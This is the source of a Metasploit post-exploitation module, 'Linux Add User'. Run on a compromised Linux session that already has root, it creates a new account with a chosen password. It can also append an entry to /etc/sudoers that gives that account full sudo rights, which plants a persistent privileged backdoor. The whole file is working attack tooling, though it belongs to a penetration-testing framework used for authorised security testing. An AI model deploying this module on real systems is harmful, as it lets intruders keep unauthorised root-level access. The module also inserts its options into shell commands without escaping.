##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/file'
require 'msf/core/post/linux/system'
require 'msf/core/post/linux/priv'

class Metasploit3 < Msf::Post

	include Msf::Post::Common
	include Msf::Post::File
	include Msf::Post::Linux::Priv
	include Msf::Post::Linux::System

	def initialize(info={})
		super( update_info( info,
				'Name'          => 'Linux Add User',
				'Description'   => %q{
					This module adds a user to the system. Requires: root permissions. NOTE: this module does not create a homedir for the user.
				},
				'License'       => MSF_LICENSE,
				'Author'        =>
					[
						'Joshua D. Abraham <jabra[at]praetorian.com>',
					],
				'Platform'      => [ 'linux' ],
				'SessionTypes'  => [ 'shell' ]
			))
			register_options(
			[
				OptString.new('USER', [true, 'User to add.']),
				OptString.new('PASS', [true, 'Password of the user.']),
				OptBool.new('SUDO', [true, 'Give user sudo privs.',true]),
			], self.class)

	end

	def run
		if is_root?
			cmd_exec_vprint("useradd #{datastore['USER']} -p #{datastore['PASS']} ")

			#
			# NOTE: We are intentionally not creating a homedir for the user
			#
			if datastore['SUDO'] == true
				cmd_exec_vprint("echo '#{datastore['USER']}	ALL=(ALL) ALL' >> /etc/sudoers ")
			end

		else
			print_error("This module require root permissions")
			return
		end
	end

	def cmd_exec_vprint(cmd)
		vprint_status("Executing: #{cmd}")
		output = cmd_exec(cmd)
		if output.length > 0
			vprint_status("#{output}")
		end
		return
	end
end
